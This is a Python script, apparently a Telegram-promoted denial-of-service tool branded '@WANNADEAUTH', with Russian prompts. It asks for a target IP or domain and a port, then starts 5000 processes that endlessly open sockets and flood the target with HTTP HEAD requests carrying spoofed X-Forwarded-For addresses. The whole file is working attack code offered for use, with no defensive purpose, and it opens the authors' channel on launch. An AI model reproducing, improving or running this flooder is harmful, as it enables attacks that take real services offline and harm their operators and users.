# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH

import socket
import os, sys
import time
import multiprocessing, random
from colorama import Fore as F

r = F.RED
y = F.YELLOW
w = F.WHITE
if os.name == 'nt':
  os.system("cls")
  import webbrowser
  webbrowser.open("https://t.me/WANNADEAUTH", new=1)
else:
  os.system("clear")
  os.system("termux-open-url https://WANNADEAUTH")

print(f"{r}db   d8b   db  .d8b.  d8b   db d8b   db  .d8b.  {y}d8888b.  .d88b.  .d8888.") 
print(f"{r}88   I8I   88 d8' `8b 888o  88 888o  88 d8' `8b {y}88  `8D .8P  Y8. 88'  YP")
print(f"{r}88   I8I   88 88ooo88 88V8o 88 88V8o 88 88ooo88 {y}88   88 88    88 `8bo.  ")
print(f"{r}Y8   I8I   88 88~~~88 88 V8o88 88 V8o88 88~~~88 {y}88   88 88    88   `Y8b.")
print(f"{r}`8b d8'8b d8' 88   88 88  V888 88  V888 88   88 {y}88  .8D `8b  d8' db   8D")
print(f"{r} `8b8' `8d8'  YP   YP VP   V8P VP   V8P YP   YP {y}Y8888D'  `Y88P'  `8888Y'")
print(f"{w}Наш канал: {y}@WANNADEAUTH                                             {w}V{r}2.1")
print(f"{w}------------------------------------------------------------------------")
ip = input("IP/Домен: ")
port = int(input("Порт: "))

url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

print("[?] Запуск атаки..")


time.sleep(1)


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

send2attack() #61 lines for the most powerful attack, cool?

# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH